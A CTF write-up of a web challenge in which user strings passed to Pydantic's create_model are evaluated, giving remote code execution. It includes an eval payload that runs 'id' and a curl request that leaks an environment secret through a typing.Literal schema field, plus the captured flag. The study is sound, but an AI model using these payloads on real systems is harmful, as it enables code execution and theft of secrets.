Restaurant Builder — CTF Writeup

Category: Web Difficulty: Intro Event: GPN CTF 24

Overview

The challenge provides a FastAPI application that allows users to register "blueprints" (Pydantic models) and "items" (instances of those models). The goal is to extract the FLAG environment variable from the server.

Source Code Analysis

The vulnerable endpoint is POST /blueprint/{name}:

@app.post("/blueprint/{name}")
def register_blueprint(name: str, description: Dict[str,str] = Body()):
    if name in blueprints:
        raise HTTPException(status_code=409, ...)
    description = {k: v for k,v in description.items() if not k.startswith("__")}
    Blueprint = create_model(name, **description)
    blueprints[name] = Blueprint
    return "Blueprint successfully registered"

The endpoint accepts a JSON body where keys are field names and values are strings. It then passes them directly to Pydantic's create_model as **kwargs.

The Vulnerability

When create_model receives string values as field definitions, Pydantic treats them as forward reference type annotations and evaluates them using Python's eval() internally.

This means any valid Python expression passed as a value will be executed on the server.

Example:

create_model("test", x="__import__('os').popen('id').read()")
# Executes: id
# Raises: SyntaxError: Forward reference must be an expression -- got 'uid=0(root)...'

The code runs, but the output is not a valid type, so model creation fails and returns HTTP 500.

The Exfiltration Problem

Simply executing commands wasn't enough — the server uses Gunicorn which suppresses exception details, returning only a generic Internal Server Error. We needed a way to surface the output in the HTTP response.

Things that didn't work:

  • Reading output from error messages (Gunicorn hides them)
  • OOB via curl to webhook.site (outbound network blocked)
  • Writing to /tmp and reading back (model creation fails before saving)

The Solution

The key insight: typing.Literal[value] is a valid type, and Pydantic includes the literal value in the JSON schema as a "const" field — which is returned by GET /blueprint/{name}.

So we can:

  1. Embed the FLAG inside a Literal type annotation
  2. Register the blueprint successfully
  3. Read it back from the schema endpoint

Payload:

curl -s -X POST "$TARGET/blueprint/getflag" \
  -H "Content-Type: application/json" \
  --data-raw '{"x": "__import__(\"typing\").Literal[__import__(\"os\").environ[\"FLAG\"]]"}'

Read the schema:

curl -s "$TARGET/blueprint/getflag"

Response:

{
  "properties": {
    "x": {
      "const": "GPNCTF{and_one_0r_TwO_RCEs_Lat3r_tHey_8uILT_HApp1lY_eVEr_AftER}",
      "title": "X",
      "type": "string"
    }
  },
  "required": ["x"],
  "title": "getflag",
  "type": "object"
}
GPNCTF{and_one_0r_TwO_RCEs_Lat3r_tHey_8uILT_HApp1lY_eVEr_AftER}

Key Takeaways

  • Never pass unsanitized user input to pydantic.create_model — string values are evaluated as type annotations.
  • The __dunder__ key filter was a red herring; the real injection surface was the values, not the keys.
  • typing.Literal is a powerful exfiltration primitive: it accepts arbitrary expressions and embeds their evaluated result directly into the JSON schema.

after action report

Lessons Learned

  • Sanitizing keys is not enough when values are interpreted as code.
  • Exception output suppression can be bypassed with a different exfiltration primitive.
  • Dynamic model creation must be treated as a dangerous sink.
